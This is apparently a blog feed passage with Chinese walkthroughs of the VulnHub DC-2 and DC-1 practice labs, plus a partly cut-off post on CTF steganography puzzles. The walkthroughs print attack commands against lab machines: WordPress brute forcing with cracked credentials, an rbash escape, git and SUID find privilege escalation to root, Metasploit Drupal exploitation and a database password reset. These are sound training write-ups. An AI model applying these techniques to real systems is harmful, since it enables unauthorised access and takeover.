    <content type="html"><![CDATA[<h1 id="一．环境搭建"><a href="#一．环境搭建" class="headerlink" title="一．环境搭建"></a>一．环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>与DC-1非常相似，DC-2是另一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>与最初的DC-1一样，它的设计考虑到了初学者。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>就像DC-1一样，有五个标志，包括最后一个标志。</p><h2 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h2><p> <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214402559.png" alt="image-20231013214402559"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214451769.png" alt="image-20231013214451769"></p><h2 id="4-设置网卡为nat模式"><a href="#4-设置网卡为nat模式" class="headerlink" title="4.设置网卡为nat模式"></a>4.设置网卡为nat模式</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214559611.png" alt="image-20231013214559611"></p><p>虚拟机开启之后界面如下(和1一样)，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214714255.png" alt="image-20231013214714255"></p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>寻找真实的靶场ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214909426.png" alt="image-20231013214909426"></p><p>Kali ip为192.168.52.152</p><p>所以分析可得靶机ip为192.168.52.131</p><h2 id="2-探端口以及服务"><a href="#2-探端口以及服务" class="headerlink" title="2.探端口以及服务"></a>2.探端口以及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215059360.png" alt="image-20231013215059360"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215130572.png" alt="image-20231013215130572"></p><p>发现开放了80端口，存在web服务，Apache&#x2F;2.4.10，</p><p>发现开放了7744端口，开放了ssh服务，OpenSSH 6.7p1</p><h2 id="3-进行访问端口"><a href="#3-进行访问端口" class="headerlink" title="3.进行访问端口"></a>3.进行访问端口</h2><p>我们访问:<a href="http://192.168.52.131/">http://192.168.52.131</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215316817.png" alt="image-20231013215316817"></p><p>本地访问不了会自动跳到DC-2。应该是给重定向了！我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。</p><p>修改hosts文件，添加靶机IP到域名dc-2的指向</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215523485.png" alt="image-20231013215523485"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215452669.png" alt="image-20231013215452669"></p><p>添加完成之后，再次访问，访问成功(我们使用kali里面的浏览器)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215834927.png" alt="image-20231013215834927"></p><p>根据wappalyzer插件可知当前运行的是一个wordpress的站点</p><h1 id="三-查找所有flag"><a href="#三-查找所有flag" class="headerlink" title="三.查找所有flag"></a>三.查找所有flag</h1><h2 id="1-站点下面存在一个flag"><a href="#1-站点下面存在一个flag" class="headerlink" title="1.站点下面存在一个flag"></a>1.站点下面存在一个flag</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215918528.png" alt="image-20231013215918528"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220044963.png" alt="image-20231013220044963"></p><p>大致意思就是暴力破解，账号密码</p><h2 id="2-我们进行目录扫描"><a href="#2-我们进行目录扫描" class="headerlink" title="2.我们进行目录扫描"></a>2.我们进行目录扫描</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220314587.png" alt="image-20231013220314587"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220408917.png" alt="image-20231013220408917"></p><p>发现一个后台地址: <a href="http://dc-2/wp-login.php?redirect_to=http://dc-2/wp-admin/&reauth=1">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;reauth=1</a></p><h2 id="3-我们进行用户枚举"><a href="#3-我们进行用户枚举" class="headerlink" title="3.我们进行用户枚举"></a>3.我们进行用户枚举</h2><p>1)前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描</p><p>Wpscan一些常用语句：</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a></p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate t 扫描主题</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate p 扫描插件</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate u 枚举用户</p><p>2)我们先进行用户爆破用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220646280.png" alt="image-20231013220646280"></p><p>可以看到爆破出来三个用户名</p><p>2)我们进行爆破密码</p><p>我们使用cewl生成字典，使用wpscan进行暴力破解</p><p>cewl <a href="http://dc-2/">http://dc-2/</a> &gt; MS02423.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220835248.png" alt="image-20231013220835248"></p><p>3)最后我们爆破出来2个账号</p><p>jerry&#x2F;adipiscing           tom&#x2F;parturient</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220912291.png" alt="image-20231013220912291"></p><p>4)我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221021765.png" alt="image-20231013221021765"></p><p>5)我们找到了flag2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221421875.png" alt="image-20231013221421875"></p><p>6)我们查看flag2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221437901.png" alt="image-20231013221437901"></p><p>意思是如果你不能利用WordPress并走捷径，还有另一种方法。</p><p>希望你找到了另一个切入点（这里我们想到7744端口，服务是ssh我们使用ssh进行登录）</p><h2 id="4-使用ssh进行登录"><a href="#4-使用ssh进行登录" class="headerlink" title="4.使用ssh进行登录"></a>4.使用ssh进行登录</h2><p>1)我们使用ssh登录账号，用jerry登录半天登录不上去，我们使用tom进行登录，发现可以登录成功，而且看到了flag3.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221825054.png" alt="image-20231013221825054"></p><p>2)我们查看flag3.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221945751.png" alt="image-20231013221945751"></p><p>我们发现使用cat看不了，被rbash限制了</p><p>3)使用compgen -c 查看可以使用的命令，我们使用vi进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222101048.png" alt="image-20231013222101048"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222123923.png" alt="image-20231013222123923"></p><h2 id="5-rbash绕过"><a href="#5-rbash绕过" class="headerlink" title="5.rbash绕过"></a>5.rbash绕过</h2><p>1)echo $PATH       显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222446343.png" alt="image-20231013222446343"></p><p>2)cd进不去目录 ,前面我们知道可以使用ls，使用ls直接查看目录信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222612721.png" alt="image-20231013222612721"></p><p>3)使用echo来绕过rbash</p><p>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</p><p>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</p><p>echo &#x2F;*</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222753663.png" alt="image-20231013222753663"></p><p>4)我们可以看到cd可以使用了，我们cd .. ls 可以看到jerry</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223443700.png" alt="image-20231013223443700"></p><p>5)我们看到flag4.txt，查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223524657.png" alt="image-20231013223524657"></p><p>意思是</p><p>很高兴看到你走了这么远，但你还没回家。</p><p>您仍然需要获得最后的标志(唯一真正重要的标志！)</p><p>这里没有暗示，一，你现在只能靠自己了。*-)</p><p>继续</p><p>大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权</p><h2 id="6-我们进行提权"><a href="#6-我们进行提权" class="headerlink" title="6.我们进行提权"></a>6.我们进行提权</h2><p>1)我们可以看到无需root权限，jerry 可以使用 git</p><p>sudo -l </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223939930.png" alt="image-20231013223939930"></p><p>2)查看一下可以使用的root权限命令</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224022322.png" alt="image-20231013224022322"></p><p>3)提权成功</p><p>1、sudo git help config #在末行命令模式输入 </p><p>!&#x2F;bin&#x2F;bash 或 !’sh’ #完成提权 </p><p>2、sudo git -p help </p><p>!&#x2F;bin&#x2F;bash #输入!&#x2F;bin&#x2F;bash，即可打开一个用户为root的shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224439557.png" alt="image-20231013224439557"></p><p>4)我们进入root用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224548835.png" alt="image-20231013224548835"></p><p>5)我们进行ls</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224558830.png" alt="image-20231013224558830"></p><p>6)我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224621819.png" alt="image-20231013224621819"></p><h1 id="四-相关知识点"><a href="#四-相关知识点" class="headerlink" title="四. 相关知识点"></a>四. 相关知识点</h1><p>1、git提权</p><p>2、rbash绕过</p><p>3、[ 常用工具篇 ] kali 自带目录扫描神器 dirb Headless (命令行)模式详解</p><p>4、WPScan使用完整攻略</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一．环境搭建&quot;&gt;&lt;a href=&quot;#一．环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一．环境搭建&quot;&gt;&lt;/a&gt;一．环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-1</title>
    <link href="http://ms02423.top/2023/09/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-1/"/>
    <id>http://ms02423.top/2023/09/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-1/</id>
    <published>2023-09-25T04:02:23.000Z</published>
    <updated>2024-01-06T14:20:38.303Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>DC-1是一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。它旨在对初学者来说是一个挑战，但它的难易程度取决于您的技能和知识以及您的学习能力。</p><h2 id="2-靶机下载地址"><a href="#2-靶机下载地址" class="headerlink" title="2.靶机下载地址"></a>2.靶机下载地址</h2><p> <a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130702413.png" alt="image-20230925130702413"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130735248.png" alt="image-20230925130735248"></p><h2 id="4-设置网卡"><a href="#4-设置网卡" class="headerlink" title="4.设置网卡"></a>4.设置网卡</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130817899.png" alt="image-20230925130817899"></p><h2 id="5-查看网段"><a href="#5-查看网段" class="headerlink" title="5.查看网段"></a>5.查看网段</h2><p>虚拟机开启之后需要登录，我们不知道密码，需要探活ip地址，</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">网段知道<span class="token punctuation">:</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130850460.png" alt="image-20230925130850460"></p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>寻找真实的靶场ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925132643084.png" alt="image-20230925132643084"></p><p>Kali ip为192.168.52.152</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">所以分析可得靶机ip为<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.132</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探端口以及服务"><a href="#2-探端口以及服务" class="headerlink" title="2.探端口以及服务"></a>2.探端口以及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925132911188.png" alt="image-20230925132911188"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">22</span>端口，开放了ssh服务，OpenSSH <span class="token number">6</span><span class="token punctuation">.</span>0p1发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd <span class="token number">2.2</span><span class="token number">.22</span>，Drupal 发现开放了<span class="token number">111</span>端口，开放了rpcbind服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-访问web站点"><a href="#3-访问web站点" class="headerlink" title="3.访问web站点"></a>3.访问web站点</h2><p><a href="http://192.168.52.132/">http://192.168.52.132/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133053418.png" alt="image-20230925133053418"></p><p>发现是一个电信的drupal服务，根据wappalyzer插件可知当前运行的是Drupal 7的CMS</p><h2 id="4-使用MSF渗透"><a href="#4-使用MSF渗透" class="headerlink" title="4.使用MSF渗透"></a>4.使用MSF渗透</h2><p>1)搜索drupal7的漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133447471.png" alt="image-20230925133447471">2)搜索drupal模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133657843.png" alt="image-20230925133657843"></p><p>3)我们使用2018的模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133840235.png" alt="image-20230925133840235"></p><p>默认端口就是80，所以这里我们不需要修改端口号</p><p>4)我们设置远程端口是靶机的ip地址——192.168.52.132,进行攻击可以看到攻击成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134159921.png" alt="image-20230925134159921"></p><p>5)我们进入shell，查看权限和id</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134325178.png" alt="image-20230925134325178"></p><p>6)我们查看所有文件，可以看到flag1.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134520923.png" alt="image-20230925134520923"></p><h1 id="三-查找所有的flag"><a href="#三-查找所有的flag" class="headerlink" title="三.查找所有的flag"></a>三.查找所有的flag</h1><p>1)使用交互式拿shell</p><p>shell</p><p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’   &#x2F;&#x2F;如果发现对方机器上有 python 的话</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134913297.png" alt="image-20230925134913297"></p><p>2)我们查看flag1.txt，打开发现提示信息，内容提示寻找站点的配置文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134953343.png" alt="image-20230925134953343"></p><p>3).我们网上搜索Drupal的默认配置文件为&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135112925.png" alt="image-20230925135112925"></p><p>4)我们查看这个文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135353283.png" alt="image-20230925135353283"></p><p>5)flag2提示，暴力和字典攻击不是常见的</p><p>只有获得访问权限的方式（以及您将需要访问）。</p><p>你可以用这些凭证做什么？</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135426631.png" alt="image-20230925135426631"></p><p>6 )登录此数据库,查看数据库信息，账号和密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135639933.png" alt="image-20230925135639933"></p><p>我们进入数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925192821102.png" alt="image-20230925192821102"></p><p>查看数据库，切换到drupaldb数据库，查看查找默认的Drupal user 表，发现admin信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925192847241.png" alt="image-20230925192847241"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193023539.png" alt="image-20230925193023539"></p><p>7)我们更改drupal密码</p><p>忘记密码的解决方法</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193106680.png" alt="image-20230925193106680"></p><p>我们使用第二种方法</p><p>站点路径下执行</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193537986.png" alt="image-20230925193537986"></p><p>然后在进入数据库中把密码字段进行替换</p><p>进入mysql，输入密码，切换到drupaldb数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193733321.png" alt="image-20230925193733321"></p><p>将pass字段进行替换</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">update users <span class="token keyword">set</span> pass<span class="token operator">=</span><span class="token string">"xxxx"</span> where name<span class="token operator">=</span><span class="token string">"admin"</span>;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194218832.png" alt="image-20230925194218832"></p><p>8)我们访问站点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194400286.png" alt="image-20230925194400286"></p><p>9)发现flag3</p><p>登陆站点之后，随便翻一番，发现flag3</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194516104.png" alt="image-20230925194516104"></p><p>10)点击flag3进入，发现提示信息</p><p>大致意思是提权并提示 -exec，想到suid提权 find 命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194557997.png" alt="image-20230925194557997"></p><p>11)使用命令查看 suid 权限的可执行二进制程序</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -perm <span class="token number">-4000</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是一个在Linux或类似系统中使用的命令。它的意思是在根目录（&#x2F;）下查找所有具有setuid位设置的文件。2&gt;&#x2F;dev&#x2F;null表示将错误消息重定向到&#x2F;dev&#x2F;null，即忽略错误消息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194747795.png" alt="image-20230925194747795"></p><p>12)我们使用find进行提权</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span>-name ms02423<span class="token punctuation">.</span><span class="token keyword">top</span> -exec <span class="token string">'whoami'</span> \;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925195014660.png" alt="image-20230925195014660"></p><p>13)我们切换语句进入shell，执行whoami查看当前权限，执行ls查看当前目录下文件，切换到root目录，查看文件，发现cat thefinalflag.txt文件。</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -name ms02423<span class="token punctuation">.</span><span class="token keyword">top</span> -exec <span class="token string">"/bin/sh"</span> \;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925195319287.png" alt="image-20230925195319287"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925195441308.png" alt="image-20230925195441308"></p><p>大致就是说你已经通过了本关卡。</p><p>14)find提权方法</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925203847635.png" alt="image-20230925203847635"></p><p>15)这个靶机的flag完全取得</p><h1 id="四-相关知识点"><a href="#四-相关知识点" class="headerlink" title="四.相关知识点"></a>四.相关知识点</h1><p>1.[ MSF使用实例 ] 利用永恒之黑采用正向连接 shell 获得主机权限(CVE-2020-0796)(SMBGhost)</p><p>2.简谈SUID提权(find提权方法)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>图片隐写</title>
    <link href="http://ms02423.top/2023/08/08/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>http://ms02423.top/2023/08/08/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2023-08-08T03:16:06.000Z</published>
    <updated>2023-08-08T12:11:10.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW——MISC"><a href="#CTFSHOW——MISC" class="headerlink" title="CTFSHOW——MISC"></a>CTFSHOW——MISC</h1><h2 id="1-杂项签到"><a href="#1-杂项签到" class="headerlink" title="1.杂项签到"></a>1.杂项签到</h2><p>1)我们下载附件，一般签到题目，都是比较简单的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808112637576.png" alt="image-20230808112637576"></p><p>2)我们打开附件，发现需要密码(猜测可能是伪加密)，我们放到010进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808112938004.png" alt="image-20230808112938004"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113203334.png" alt="image-20230808113203334"></p><p>3)查看flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113230123.png" alt="image-20230808113230123"></p><p>知识点:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">zip伪加密就是通过修改zip压缩包特定的字节，进而在打开文件时压缩包被识别为使用了密码加密，从而达到伪装加密效果。一个ZIP文件由三大部分组成：压缩源文件数据区<span class="token operator">+</span>压缩源文件目录区<span class="token operator">+</span>压缩源文件目录结束标志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">识别一个zip文件是否加密主要是看压缩源文件数据的全局方式位标记和压缩源文件目录区的全局方式位标记，关键操作在其中的全局方式标记的第一字节数字的奇偶上，其它的不管为何值，都不影响它的加密属性。通常全局方式位标记为<span class="token number">2</span> bytes长度，第一字节数字为偶数表示无加密，例如：<span class="token number">00,02</span><span class="token number">,04</span>等；为奇数表示有加密，例如<span class="token number">01,03</span><span class="token number">,09</span>等。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.无加密<br>无加密的zip压缩包压缩源文件数据区的全局加密应当为00 00，且压缩源文件目录区的全局方式位标记也为 00 00。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113701580.png" alt="image-20230808113701580"></p><p>2.真加密<br>真加密的zip压缩包压缩源文件数据区的全局加密应当为01 00，且压缩源文件目录区的全局方式位标记应当为 01 00。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113646038.png" alt="image-20230808113646038"></p><p>3.伪加密<br>伪加密的zip压缩包压缩源文件数据区的全局加密为 00 00，且压缩源文件目录区的全局方式位标记为09 00或者01 00。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113711535.png" alt="image-20230808113711535"></p><h2 id="2-misc2"><a href="#2-misc2" class="headerlink" title="2.misc2"></a>2.misc2</h2><p>1)我们下载附件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808114115016.png" alt="image-20230808114115016"></p><p>2)虚拟机添加软盘file即可<br> 如何添加软盘呢？<br> 先创建一个虚拟机，一切默认就好。<br> 编辑虚拟机设置，一般的没有软盘选项，需要手动添加。下面有一个添加按钮，加上软盘就可以啦！</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808114623586.png" alt="image-20230808114623586"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808114632401.png" alt="image-20230808114632401"></p><h2 id="3-miscx"><a href="#3-miscx" class="headerlink" title="3.miscx"></a>3.miscx</h2><p>1).我们下载附件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115214629.png" alt="image-20230808115214629"></p><p>2)我们进行提取文件，发现需要密码，但是最后一个没有加密，我们打开之后是一串音乐字符我们进行解密。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115312556.png" alt="image-20230808115312556"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115322643.png" alt="image-20230808115322643"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115333156.png" alt="image-20230808115333156"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115349537.png" alt="image-20230808115349537"></p><p>3)我们可以看到解密之后是隐藏rabbit编码，我们进行解密密码是2020</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rabbit使用一个<span class="token number">128</span>位和一个<span class="token number">64</span>位初始化向量。该加密算法的核心组件是一个位流生成器，该生成器每次迭代都会加密<span class="token number">128</span>个消息位。加密后的数据以U2FsdGVkX1开头，可以设定密钥。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115404196.png" alt="image-20230808115404196"></p><p>4)解密之后是welcome_to_payhelp，是hint.txt的密码，我们可以看到一串base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115437737.png" alt="image-20230808115437737"></p><p>解密6次之后，发现是url编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151319402.png" alt="image-20230808151319402"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151444276.png" alt="image-20230808151444276"></p><p>5)提取flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151600074.png" alt="image-20230808151600074"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151625694.png" alt="image-20230808151625694"></p><h2 id="4-misc30"><a href="#4-misc30" class="headerlink" title="4.misc30"></a>4.misc30</h2><p>1)我们下载附件,放到010进行分析</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151820670.png" alt="image-20230808151820670"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151923947.png" alt="image-20230808151923947"></p><p>2)可以看到是一个压缩包文件，我们重命名为1.rar，打开之后可以看到3个文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152005032.png" alt="image-20230808152005032"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152056314.png" alt="image-20230808152056314"></p><p>3)除了星空.jpg不需要密码外，其他两个都需要，我们从星空.jpg下手</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152244213.png" alt="image-20230808152244213"></p><p>属性里面看到little stars，猜测是密码，果不其然的doc的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152341427.png" alt="image-20230808152341427"></p><p>4)可以看到没有如何有用信息，但是可以看到好多的箭头，我们把页面颜色弄成黑色即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152623025.png" alt="image-20230808152623025"></p><p>5)猜测是flag.png的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152901333.png" alt="image-20230808152901333"></p><p>提取之后是一个二维码，我们使用工具即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152932329.png" alt="image-20230808152932329"></p><p>知识点:word隐写</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">1</span><span class="token punctuation">.</span>文件本质：       <span class="token level number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>原理： word文件的后缀名是<span class="token punctuation">.</span>docx，而它的文件本质是一个zip压缩文件<span class="token punctuation">(</span>这里隐写我们会在后面遇到<span class="token punctuation">)</span>       <span class="token level number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>方法： 我们可以在压缩文件中将后缀从<span class="token punctuation">.</span>docx改为<span class="token punctuation">.</span>zip<span class="token level number">2</span><span class="token punctuation">.</span>文字颜色和文字隐藏：       <span class="token level number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>原理：文字颜色：文字颜色与背景颜色重合        